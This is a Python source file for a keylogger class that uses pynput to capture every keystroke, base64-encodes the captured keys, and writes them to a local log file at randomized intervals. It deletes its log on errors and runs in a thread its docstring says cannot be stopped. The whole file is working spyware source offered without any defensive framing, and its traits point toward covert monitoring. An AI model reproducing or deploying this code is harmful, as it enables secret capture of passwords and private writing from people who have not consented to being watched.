import os
import pynput
import threading
import time
from typing import List
import base64
from random import randint

THREE_MINUTES_IN_SECONDS = 180
FIVE_MINUTES_IN_SECONDS = 500


class KeyLogger:
    def __init__(self, logFilePath: str):
        self._logFilePath = logFilePath
        self._logFile = open(logFilePath, "wb")
        self._keyboardListner = pynput.keyboard.Listener(on_press=self._onKeyPress)
        self._cache: List[str] = []

    def _onKeyPress(self, key: pynput.keyboard.Key) -> None:
        """Add user inputted key to the logs."""
        self._cache.append(f"{key}")

    def _logKeys(self) -> None:
        """Log all keys typed by the user.
        
        It saves the keys typed by the user every 3 to 5 minutes.

        Note that this removes any log files in case of an exception.
        """
        self._keyboardListner.start()

        try:
            while True:
                randomNumberOfSeconds = randint(
                    THREE_MINUTES_IN_SECONDS, FIVE_MINUTES_IN_SECONDS
                )
                time.sleep(randomNumberOfSeconds)
                self._writeToLogFile()
        except:
            self._keyboardListner.stop()
            self._logFile.close()
            os.remove(self._logFilePath)

    def _writeToLogFile(self) -> None:
        """Write all stored data to a file and clear the memory"""
        keysAsOneString = " ".join(self._cache)
        encodedKeys = base64.encodebytes(keysAsOneString.encode("utf-8"))

        self._logFile.write(encodedKeys)
        self._logFile.flush()
        self._cache.clear()

    def start(self) -> None:
        """Start logging keys.
        
        Note that this method starts a thread to log keys. It is not
        possible to stop this thread.
        """
        thread = threading.Thread(target=self._logKeys)
        thread.start()
